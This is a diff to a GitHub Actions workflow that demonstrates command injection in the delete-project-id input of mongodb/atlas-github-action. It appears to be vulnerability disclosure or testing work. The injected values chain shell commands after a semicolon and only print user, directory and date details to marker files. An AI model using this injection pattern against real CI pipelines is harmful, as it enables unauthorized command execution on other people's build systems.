@@ -15,11 +15,12 @@ jobs:
 
       - name: POC - Command Injection via delete-project-id
         uses: mongodb/atlas-github-action@v0.2.0
+        continue-on-error: true
         with:
           # This demonstrates command injection - the semicolon allows command chaining
           # The injected command will execute BEFORE the atlas command fails
-          delete-project-id: "fake-project-id; echo '🚨 COMMAND INJECTION SUCCESSFUL 🚨' > /tmp/poc-success.txt; echo 'Injected command executed!' && id && whoami && pwd"
-          delete-cluster-name: "any-cluster-name"
+          # Format: atlas project delete ${{ inputs.delete-project-id }} --force
+          delete-project-id: "507f1f77bcf86cd799439011; echo '🚨 COMMAND INJECTION SUCCESSFUL 🚨' > /tmp/poc-success.txt && echo 'Injected via delete-project-id!' && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) > /tmp/poc-delete-project-info.txt || true"
 
       - name: Verify Injection
         shell: bash
